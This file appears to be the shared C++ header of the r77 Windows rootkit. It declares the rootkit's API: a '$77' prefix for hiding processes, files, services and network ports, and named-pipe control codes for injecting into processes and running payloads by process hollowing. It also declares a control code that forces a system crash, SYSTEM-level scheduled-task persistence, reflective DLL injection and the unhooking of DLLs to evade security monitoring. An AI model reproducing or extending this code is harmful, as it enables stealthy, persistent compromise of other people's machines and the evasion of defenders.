#pragma warning(disable: 6258) // Using TerminateThread does not allow proper thread clean up.
#pragma warning(disable: 26812) // The enum type is unscoped. Prefer 'enum class' over 'enum'
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

#include <Windows.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <aclapi.h>
#include <sddl.h>
#include <initguid.h>
#include <MSTask.h>
#include <stdio.h>
#include <cwchar>
#include <time.h>
#include "ntdll.h"

// These preprocessor definitions must match the constants in GlobalAssemblyInfo.cs

/// <summary>
/// Set a random seed.
/// <para>Example: InitializeApi(INITIALIZE_API_SRAND)</para>
/// </summary>
#define INITIALIZE_API_SRAND					1
/// <summary>
/// Obtain SeDebugPrivilege, if possible.
/// <para>Example: InitializeApi(INITIALIZE_API_DEBUG_PRIVILEGE)</para>
/// </summary>
#define INITIALIZE_API_DEBUG_PRIVILEGE			2

/// <summary>
/// The prefix for name based hiding (e.g. processes, files, etc...).
/// </summary>
#define HIDE_PREFIX								L"$77"
/// <summary>
/// The length of the hide prefix, excluding the terminating null character.
/// </summary>
#define HIDE_PREFIX_LENGTH						(sizeof(HIDE_PREFIX) / sizeof(WCHAR) - 1)

/// <summary>
/// r77 header signature: The process is injected with the r77 DLL.
/// </summary>
#define R77_SIGNATURE							0x7277
/// <summary>
/// r77 header signature: The process is the r77 service process.
/// </summary>
#define R77_SERVICE_SIGNATURE					0x7273
/// <summary>
/// r77 header signature: The process is an r77 helper file (e.g. TestConsole.exe).
/// </summary>
#define R77_HELPER_SIGNATURE					0x7268

/// <summary>
/// Name for the scheduled task that starts the r77 service for 32-bit processes.
/// </summary>
#define R77_SERVICE_NAME32						HIDE_PREFIX L"svc32"
/// <summary>
/// Name for the scheduled task that starts the r77 service for 64-bit processes.
/// </summary>
#define R77_SERVICE_NAME64						HIDE_PREFIX L"svc64"

/// <summary>
/// Name for the named pipe that notifies the 32-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME32				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc32"
/// <summary>
/// Name for the named pipe that notifies the 64-bit r77 service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME64				L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc64"

/// <summary>
/// Name for the named pipe that receives commands from external processes.
/// </summary>
#define CONTROL_PIPE_NAME						L"\\\\.\\pipe\\" HIDE_PREFIX L"control"
/// <summary>
/// Name for the internally used named pipe of the 64-bit r77 service that receives redirected commands from the 32-bit r77 service.
/// <para>Do not use! Always use CONTROL_PIPE_NAME.</para>
/// </summary>
#define CONTROL_PIPE_REDIRECT64_NAME			L"\\\\.\\pipe\\" HIDE_PREFIX L"control_redirect64"

/// <summary>
/// Specifies a list of processes that will not be injected.
/// By default, this list includes processes that are known to cause problems.
/// To customize this list, add custom entries and recompile.
/// </summary>
#define PROCESS_EXCLUSIONS						{ L"MSBuild.exe" }
// Example: { L"MSBuild.exe", L"your_app.exe", L"another_app.exe" }

/// <summary>
/// The control code that terminates the r77 service.
/// </summary>
#define CONTROL_R77_TERMINATE_SERVICE			0x1001
/// <summary>
/// The control code that uninstalls r77.
/// </summary>
#define CONTROL_R77_UNINSTALL					0x1002
/// <summary>
/// The control code that temporarily pauses injection of new processes.
/// </summary>
#define CONTROL_R77_PAUSE_INJECTION				0x1003
/// <summary>
/// The control code that resumes injection of new processes.
/// </summary>
#define CONTROL_R77_RESUME_INJECTION			0x1004
/// <summary>
/// The control code that injects r77 into a specific process, if it is not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT				0x2001
/// <summary>
/// The control code that injects r77 into all processes that are not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT_ALL			0x2002
/// <summary>
/// The control code that detaches r77 from a specific process.
/// </summary>
#define CONTROL_PROCESSES_DETACH				0x2003
/// <summary>
/// The control code that detaches r77 from all processes.
/// </summary>
#define CONTROL_PROCESSES_DETACH_ALL			0x2004
/// <summary>
/// The control code that executes a file using ShellExecute.
/// </summary>
#define CONTROL_USER_SHELLEXEC					0x3001
/// <summary>
/// The control code that executes an executable using process hollowing.
/// </summary>
#define CONTROL_USER_RUNPE						0x3002
/// <summary>
/// The control code that triggers a BSOD.
/// </summary>
#define CONTROL_SYSTEM_BSOD						0x4001

/// <summary>
/// A callback that notifies about a process ID.
/// </summary>
typedef VOID(*PROCESSIDCALLBACK)(DWORD processId);
/// <summary>
/// A callback that notifies the r77 service about a command.
/// </summary>
typedef VOID(*CONTROLCALLBACK)(DWORD controlCode, HANDLE pipe);

/// <summary>
/// Defines a collection of ULONG values.
/// </summary>
typedef struct _INTEGER_LIST
{
	/// <summary>
	/// The number of ULONG values in this list.
	/// </summary>
	DWORD Count;
	/// <summary>
	/// The currently allocated capacity of the buffer. The buffer expands automatically when values are added.
	/// </summary>
	DWORD Capacity;
	/// <summary>
	/// A buffer that stores the ULONG values in this list.
	/// </summary>
	PULONG Values;
} INTEGER_LIST, *PINTEGER_LIST;

/// <summary>
/// Defines a collection of strings.
/// </summary>
typedef struct _STRING_LIST
{
	/// <summary>
	/// The number of strings in this list.
	/// </summary>
	DWORD Count;
	/// <summary>
	/// The currently allocated capacity of the buffer. The buffer expands automatically when values are added.
	/// </summary>
	DWORD Capacity;
	/// <summary>
	/// TRUE to treat strings as case insensitive.
	/// </summary>
	BOOL IgnoreCase;
	/// <summary>
	/// A buffer that stores the strings in this list.
	/// </summary>
	LPWSTR *Values;
} STRING_LIST, *PSTRING_LIST;

/// <summary>
/// Defines the r77 header.
/// </summary>
typedef struct _R77_PROCESS
{
	/// <summary>
	/// The process ID of the process.
	/// </summary>
	DWORD ProcessId;
	/// <summary>
	/// The signature (R77_SIGNATURE, R77_SERVICE_SIGNATURE, or R77_HELPER_SIGNATURE).
	/// </summary>
	WORD Signature;
	/// <summary>
	/// A function pointer to Rootkit::Detach in the remote process. This function detaches the injected r77 DLL
	/// <para>Applies only, if Signature == R77_SIGNATURE.</para>
	/// </summary>
	DWORD64 DetachAddress;
} R77_PROCESS, *PR77_PROCESS;

/// <summary>
/// Defines the global configuration for r77.
/// </summary>
typedef struct _R77_CONFIG
{
	/// <summary>
	/// A list of file paths to start when windows starts.
	/// </summary>
	PSTRING_LIST StartupFiles;
	/// <summary>
	/// A list of process ID's to hide in addition to processes hidden by the prefix.
	/// </summary>
	PINTEGER_LIST HiddenProcessIds;
	/// <summary>
	/// A list of process names to hide in addition to processes hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenProcessNames;
	/// <summary>
	/// A list of file or directory full paths to hide in addition to files and directories hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenPaths;
	/// <summary>
	/// A list of service names to hide in addition to services hidden by the prefix.
	/// </summary>
	PSTRING_LIST HiddenServiceNames;
	/// <summary>
	/// A list of local TCP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenTcpLocalPorts;
	/// <summary>
	/// A list of remote TCP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenTcpRemotePorts;
	/// <summary>
	/// A list of UDP ports to hide.
	/// </summary>
	PINTEGER_LIST HiddenUdpPorts;
} R77_CONFIG, *PR77_CONFIG;

/// <summary>
/// Defines a listener, that checks for new processes in a given interval.
/// </summary>
typedef struct _NEW_PROCESS_LISTENER
{
	/// <summary>
	/// The interval, in milliseconds, between each enumeration of running processes.
	/// </summary>
	DWORD Interval;
	/// <summary>
	/// The function that is called, when a process is found that was not present in the previous enumeration.
	/// </summary>
	PROCESSIDCALLBACK Callback;
} NEW_PROCESS_LISTENER, *PNEW_PROCESS_LISTENER;

/// <summary>
/// Initializes API features.
/// </summary>
/// <param name="flags">One or multiple flags to specify what should be initialized, or 0, if nothing should be initialized.</param>
VOID InitializeApi(DWORD flags);
/// <summary>
/// Generates a random lowercase hexadecimal string.
/// </summary>
/// <param name="str">A buffer of unicode characters to write the string to.</param>
/// <param name="length">The number of characters to write.</param>
VOID RandomString(PWCHAR str, DWORD length);
/// <summary>
/// Converts a LPCWSTR into a null terminated LPCSTR.
/// </summary>
/// <param name="str">The LPCWSTR to convert.</param>
/// <returns>
/// A newly allocated LPCSTR with the converted LPCWSTR.
/// </returns>
LPCSTR ConvertStringToAString(LPCWSTR str);
/// <summary>
/// Converts a UNICODE_STRING into a null terminated LPWSTR.
/// </summary>
/// <param name="str">The UNICODE_STRING to convert.</param>
/// <returns>
/// A newly allocated LPWSTR with the converted UNICODE_STRING.
/// </returns>
LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
/// <summary>
/// Determines whether the operating system is a 64-bit operating system.
/// </summary>
/// <returns>
/// TRUE, if the operating system is a 64-bit operating system;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitOperatingSystem();
/// <summary>
/// Determines whether a process is a 64-bit process.
/// </summary>
/// <param name="processId">The process ID to check.</param>
/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit);
/// <summary>
/// Retrieves a function from a DLL specified by a name.
/// </summary>
/// <param name="dll">The name of the DLL to retrieve the function from.</param>
/// <param name="function">The name of the function to retrieve.</param>
/// <returns>
/// A pointer to the function, or NULL, if either the DLL was not found or does not have a function by the specified name.
/// </returns>
LPVOID GetFunction(LPCSTR dll, LPCSTR function);
/// <summary>
/// Gets the integrity level of a process.
/// </summary>
/// <param name="process">The process ID to check.</param>
/// <param name="integrityLevel">A pointer to a DWORD value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel);
/// <summary>
/// Gets the filename or the full path of a process.
/// </summary>
/// <param name="processId">The process ID to retrieve the filename or full path from.</param>
/// <param name="fullPath">TRUE to return the full path, FALSE to return only the filename.</param>
/// <param name="fileName">A buffer to write the filename or full path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Gets the username of a process.
/// </summary>
/// <param name="process">The handle to the process to check.</param>
/// <param name="name">A buffer of unicode characters to write the result to.</param>
/// <param name="nameLength">The length of the result buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessUserName(HANDLE process, PWCHAR name, LPDWORD nameLength);
/// <summary>
/// Obtains the SeDebugPrivilege.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL EnabledDebugPrivilege();
/// <summary>
/// Gets an executable resource.
/// </summary>
/// <param name="resourceID">The identifier of the resource.</param>
/// <param name="type">The type identifier of the resource.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the resource data.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size);
/// <summary>
/// Retrieves the full path from a file handle.
/// </summary>
/// <param name="file">A file handle to retrieve the path from.</param>
/// <param name="fileName">A buffer to write the path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Reads the contents of a file.
/// </summary>
/// <param name="path">The path to the file to read.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the file contents.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size);
/// <summary>
/// Reads a null terminated LPCWSTR from the specified file.
/// </summary>
/// <param name="file">A file handle to read the string from.</param>
/// <param name="str">The buffer to write the string to.</param>
/// <param name="length">The length of the string buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// FALSE, if the string was longer than the specified buffer, or the end of the file was reached before the null terminator.
/// </returns>
BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length);
/// <summary>
/// Writes a buffer to a file.
/// </summary>
/// <param name="path">The path to the file to create.</param>
/// <param name="data">A buffer to write to the file.</param>
/// <param name="size">The number of bytes to write.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size);
/// <summary>
/// Creates a file with a random filename and a given extension in the temp directory and writes a given buffer to it.
/// </summary>
/// <param name="file">A buffer to write to the file.</param>
/// <param name="fileSize">The number of bytes to write.</param>
/// <param name="extension">The extension to append to the random filename, excluding the dot.</param>
/// <param name="resultPath">A buffer of unicode characters to write the path of the created file to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath);
/// <summary>
/// Executes a file and waits for the process to exit.
/// </summary>
/// <param name="path">The path to the file to execute.</param>
/// <param name="deleteFile">TRUE, to attempt to delete the file. A total of 10 deletion attempts with a delay of 100 ms is performed.</param>
/// <returns>
/// TRUE, if the file was successfully executed;
/// otherwise, FALSE.
/// If the file was executed, but deletion failed, TRUE is returned.
/// </returns>
BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile);
/// <summary>
/// Creates a scheduled task that is set to run under the SYSTEM account before the user logs in.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <param name="directory">The working directory of the scheduled task.</param>
/// <param name="fileName">The application name of the scheduled task.</param>
/// <param name="arguments">The commandline arguments to pass to the created process.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments);
/// <summary>
/// Starts a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL RunScheduledTask(LPCWSTR name);
/// <summary>
/// Deletes a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DeleteScheduledTask(LPCWSTR name);
/// <summary>
/// Creates a named pipe that is accessible by every process.
/// </summary>
/// <param name="name">The name of the named pipe to be created.</param>
/// <returns>
/// A handle to the newly created named pipe, or INVALID_HANDLE_VALUE, if creation failed.
/// </returns>
HANDLE CreatePublicNamedPipe(LPCWSTR name);

/// <summary>
/// Determines the bitness of an executable file.
/// </summary>
/// <param name="image">A buffer containing the executable file.</param>
/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
/// <summary>
/// Creates a new process using the process hollowing technique.
/// <para>The bitness of the current process, the created process and the payload must match.</para>
/// </summary>
/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and the payload.</param>
/// <param name="payload">The actual executable that is the payload of the new process, regardless of the path argument.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL RunPE(LPCWSTR path, LPBYTE payload);
/// <summary>
/// Injects a DLL using reflective DLL injection.
/// <para>The DLL must export a function called "ReflectiveDllMain".</para>
/// <para>The bitness of the target process must match that of the current process.</para>
/// <para>The integrity level of the target process must be at least medium.</para>
/// <para>The process must not be critical.</para>
/// </summary>
/// <param name="processId">The process to inject the DLL in.</param>
/// <param name="dll">A buffer with the DLL file.</param>
/// <param name="dllSize">dllSize The size of the DLL file.</param>
/// <param name="fast">TRUE to not wait for DllMain to return. If this parameter is set, this function does not return FALSE, if DllMain returned FALSE.</param>
/// <returns>
/// TRUE, if the DLL was successfully injected and DllMain returned TRUE;
/// otherwise, FALSE.
/// </returns>
BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast);
/// <summary>
/// Gets the RVA of an exported function called "ReflectiveDllMain".
/// </summary>
/// <param name="dll">A buffer with the DLL file.</param>
/// <returns>
/// The RVA of the exported function; or 0, if this function fails.
/// </returns>
DWORD GetReflectiveDllMain(LPBYTE dll);
/// <summary>
/// Converts a RVA to a file offset.
/// </summary>
/// <param name="dll">A buffer with the DLL file.</param>
/// <param name="rva">The RVA to convert.</param>
/// <returns>
/// The file offset converted from the specified RVA; or 0, if this function fails.
/// </returns>
DWORD RvaToOffset(LPBYTE dll, DWORD rva);
/// <summary>
/// Unhooks a DLL by replacing the .text section with the original DLL section.
/// </summary>
/// <param name="name">The name of the DLL to unhook.</param>
VOID UnhookDll(LPCWSTR name);
/// <summary>
/// Determines whether the process is on the process exclusion list and should not be injected.
/// </summary>
/// <param name="processId">The process ID to check.</param>
/// <returns>
/// TRUE, if the process should not be injected;
/// otherwise, FALSE.
/// </returns>
BOOL IsProcessExcluded(DWORD processId);

/// <summary>
/// Creates a new INTEGER_LIST.
/// </summary>
/// <returns>
/// A pointer to the newly created INTEGER_LIST structure.
/// </returns>
PINTEGER_LIST CreateIntegerList();
/// <summary>
/// Loads DWORD values from the specified registry key into the specified INTEGER_LIST structure.
/// <para>Values that are already in the list are not added.</para>
/// </summary>
/// <param name="list">The INTEGER_LIST structure to add the values to.</param>
/// <param name="key">The registry key to read DWORD values from.</param>
VOID LoadIntegerListFromRegistryKey(PINTEGER_LIST list, HKEY key);
/// <summary>
/// Deletes the specified INTEGER_LIST structure.
/// </summary>
/// <param name="list">The INTEGER_LIST structure to delete.</param>
VOID DeleteIntegerList(PINTEGER_LIST list);
/// <summary>
/// Adds a ULONG value to the specified INTEGER_LIST.
/// </summary>
/// <param name="list">The INTEGER_LIST structure to add the ULONG value to.</param>
/// <param name="value">The ULONG value to add to the list.</param>
VOID IntegerListAdd(PINTEGER_LIST list, ULONG value);
/// <summary>
/// Determines whether the ULONG value is in the specified INTEGER_LIST.
/// </summary>
/// <param name="list">The INTEGER_LIST structure to search.</param>
/// <param name="value">The ULONG value to check.</param>
/// <returns>
/// TRUE, if the specified ULONG value is in the specified INTEGER_LIST;
/// otherwise, FALSE.
/// </returns>
BOOL IntegerListContains(PINTEGER_LIST list, ULONG value);
/// <summary>
/// Compares two INTEGER_LIST structures for equality.
/// </summary>
/// <param name="listA">The first INTEGER_LIST structure.</param>
/// <param name="listB">The second INTEGER_LIST structure.</param>
/// <returns>
/// TRUE, if both INTEGER_LIST structures are equal;
/// otherwise, FALSE.
/// </returns>
BOOL CompareIntegerList(PINTEGER_LIST listA, PINTEGER_LIST listB);

/// <summary>
/// Creates a new STRING_LIST.
/// </summary>
/// <param name="ignoreCase">TRUE to treat strings as case insensitive.</param>
/// <returns>
/// A pointer to the newly created STRING_LIST structure.
/// </returns>
PSTRING_LIST CreateStringList(BOOL ignoreCase);
/// <summary>
/// Loads REG_SZ values from the specified registry key into the specified STRING_LIST structure.
/// <para>Strings that are already in the list are not added.</para>
/// </summary>
/// <param name="list">The STRING_LIST structure to add the strings to.</param>
/// <param name="key">The registry key to read REG_SZ values from.</param>
/// <param name="maxStringLength">The maximum length of REG_SZ values that are read from the registry key.</param>
VOID LoadStringListFromRegistryKey(PSTRING_LIST list, HKEY key, DWORD maxStringLength);
/// <summary>
/// Deletes the specified STRING_LIST structure.
/// </summary>
/// <param name="list">The STRING_LIST structure to delete.</param>
VOID DeleteStringList(PSTRING_LIST list);
/// <summary>
/// Adds a string to the specified STRING_LIST.
/// </summary>
/// <param name="list">The STRING_LIST structure to add the string to.</param>
/// <param name="value">The string to add to the list.</param>
VOID StringListAdd(PSTRING_LIST list, LPCWSTR value);
/// <summary>
/// Determines whether the string is in the specified STRING_LIST.
/// </summary>
/// <param name="list">The STRING_LIST structure to search.</param>
/// <param name="value">The string to check.</param>
/// <returns>
/// TRUE, if the specified string is in the specified STRING_LIST;
/// otherwise, FALSE.
/// </returns>
BOOL StringListContains(PSTRING_LIST list, LPCWSTR value);
/// <summary>
/// Compares two STRING_LIST structures for equality.
/// </summary>
/// <param name="listA">The first STRING_LIST structure.</param>
/// <param name="listB">The second STRING_LIST structure.</param>
/// <returns>
/// TRUE, if both STRING_LIST structures are equal;
/// otherwise, FALSE.
/// </returns>
BOOL CompareStringList(PSTRING_LIST listA, PSTRING_LIST listB);

/// <summary>
/// Retrieves a list of all processes where an r77 header is present.
/// <para>The result includes only processes where the bitness matches that of the current process.</para>
/// </summary>
/// <param name="r77Processes">A buffer with R77_PROCESS structures to write the result to.</param>
/// <param name="count">A DWORD pointer with the number of structures in the buffer. The number of returned entries is written to this value.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count);
/// <summary>
/// Detaches r77 from the specified process.
/// <para>The bitness of the target process must match that of the current process.</para>
/// </summary>
/// <param name="r77Process">The process to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcess(const R77_PROCESS &r77Process);
/// <summary>
/// Detaches r77 from the specified process.
/// <para>The bitness of the target process must match that of the current process.</para>
/// </summary>
/// <param name="processId">The process ID to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DetachInjectedProcess(DWORD processId);
/// <summary>
/// Detaches r77 from all running processes.
/// <para>Only processes where the bitness matches that of the current process are detached.</para>
/// </summary>
VOID DetachAllInjectedProcesses();
/// <summary>
/// Terminates all r77 service processes. Typically, there are two active r77 service processes, one 32-bit and one 64-bit process.
/// <para>Only processes where the bitness matches that of the current process are terminated.</para>
/// </summary>
/// <param name="excludedProcessId">
/// A process ID that should not be terminated. Use -1 to not exclude any processes.
/// </param>
VOID TerminateR77Service(DWORD excludedProcessId);

/// <summary>
/// Loads the global configuration for r77.
/// </summary>
/// <returns>
/// A newly allocated R77_CONFIG structure.
/// </returns>
PR77_CONFIG LoadR77Config();
/// <summary>
/// Deletes the specified R77_CONFIG structure.
/// </summary>
/// <param name="config">The R77_CONFIG structure to delete.</param>
VOID DeleteR77Config(PR77_CONFIG config);
/// <summary>
/// Compares two R77_CONFIG structures for equality.
/// </summary>
/// <param name="configA">The first R77_CONFIG structure.</param>
/// <param name="configB">The second R77_CONFIG structure.</param>
/// <returns>
/// TRUE, if both R77_CONFIG structures are equal;
/// otherwise, FALSE.
/// </returns>
BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB);
/// <summary>
/// Creates the r77 configuration registry key with full access to all users.
/// </summary>
/// <param name="key">The newly created HKEY.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL InstallR77Config(PHKEY key);
/// <summary>
/// Deletes the r77 configuration from the registry.
/// </summary>
VOID UninstallR77Config();

/// <summary>
/// Creates a named pipe that listens for notifications about created child processes.
/// </summary>
/// <param name="callback">The function that is called, when the named pipe received a process ID.</param>
VOID ChildProcessListener(PROCESSIDCALLBACK callback);
/// <summary>
/// Notifies the child process listener about a new child process. When this function returns, the child process has been injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL HookChildProcess(DWORD processId);

/// <summary>
/// Creates a new process listener, that checks for new processes in a given interval.
/// </summary>
/// <param name="interval">The interval, in milliseconds, between each enumeration of running processes.</param>
/// <param name="callback">The function that is called, when a process is found that was not present in the previous enumeration.</param>
/// <returns>
/// A pointer to the newly created NEW_PROCESS_LISTENER structure.
/// </returns>
PNEW_PROCESS_LISTENER NewProcessListener(DWORD interval, PROCESSIDCALLBACK callback);

/// <summary>
/// Creates a new listener for the control pipe that receives commands from any process.
/// </summary>
/// <param name="callback">The function that is called, when a command is received by another process.</param>
VOID ControlPipeListener(CONTROLCALLBACK callback);

namespace nt
{
	NTSTATUS NTAPI NtQueryObject(HANDLE handle, nt::OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
	NTSTATUS NTAPI NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
	NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
	NTSTATUS NTAPI RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);
}